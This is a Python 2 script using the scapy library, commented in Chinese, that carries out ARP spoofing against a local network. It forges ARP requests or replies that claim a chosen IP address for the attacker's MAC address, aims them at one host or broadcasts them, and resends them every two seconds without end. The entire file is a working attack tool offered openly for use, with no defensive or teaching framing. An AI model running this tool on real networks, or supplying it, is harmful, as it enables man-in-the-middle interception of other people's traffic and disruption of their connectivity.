#! /usr/bin/python
# -*- coding:utf-8 -*-

import os
import sys
from optparse import OptionParser
from scapy.all import (
    get_if_hwaddr,
    getmacbyip,
    ARP,
    Ether,
    sendp
)


def arp_crack():
    # 检查是否是root权限, 如果不是则退出
    exit_if_not_root()
    # 配置命令行参数
    (options, args) = config_option_parser()
    # 构建arp请求包
    packet = build_arp_packet(options, args)
    # 提示用户是否继续执行(如果命令行里设置了 -s 选项)
    confirm_send_packet(options, packet)
    # 发送数据包... arp欺骗开始～
    send_arp_packet(packet, options.interface)


def build_arp_packet(options, args):
    if options.mode == 'req':
        return build_req_packet(options, args)
    elif options.mode == 'resp':
        return build_resp_packet(options, args)


def build_req_packet(options, args):
    """
    构建arp请求包
    :param options:  配置参数 如 -i eth0 -> interface=eth0
    :param args: 请求参数
    """
    mac = get_if_hwaddr(options.interface)

    if options.target is None:

        pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=args[0], pdst=args[0])

    elif options.target:

        target_mac = getmacbyip(options.target)

        if target_mac is None:
            print "[-] Error: Could not resolve targets MAC address"

            sys.exit(1)

        pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, pdst=options.target)

    return pkt


def build_resp_packet(options, args):
    mac = get_if_hwaddr(options.interface)

    if options.target is None:

        pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=args[0], op=2)

    elif options.target:

        target_mac = getmacbyip(options.target)

        if target_mac is None:
            print "[-] Error: Could not resolve targets MAC address"

            sys.exit(1)

        pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, pdst=options.target,
                                                   op=2)

    return pkt


def confirm_send_packet(options, packet):
    if options.summary is True:
        packet.show()
        answer = raw_input('\n[*] Continue? [Y|n]: ').lower()
        if answer == 'y' or len(answer) == 0:
            pass
        else:
            sys.exit(0)


def send_arp_packet(packet, interface):
    """
    :param packet: 要发送的数据包
    :param interface: 网卡 如eth0
    """
    while True:
        sendp(packet, inter=2, iface=interface)


def check_option_parser(parser):
    (options, args) = parser.parse_args()
    if len(args) != 1 or options.interface is None:
        parser.print_help()
        sys.exit(0)

    return options, args


def config_option_parser():
    usage = 'Usage: %prog [-i interface] [-t target] host'
    parser = OptionParser(usage)
    parser.add_option('-i', dest='interface', help='Specify the interface to use')
    parser.add_option('-t', dest='target', help='Specify a particular host to ARP poison')
    parser.add_option('-m', dest='mode', default='resp',
                      help='Poisoning mode: requests (req) or replies (resp) [default: %default]')
    parser.add_option('-s', action='store_true', dest='summary', default=False,
                      help='Show packet summary and ask for confirmation before poisoning')

    return check_option_parser(parser)


def exit_if_not_root():
    """
    check the run level if root,
    if not, exit
    """
    try:
        if os.geteuid() != 0:
            print "[-] Run me as root"
            sys.exit(1)
    except Exception, msg:
        print msg


if __name__ == '__main__':
    arp_crack()
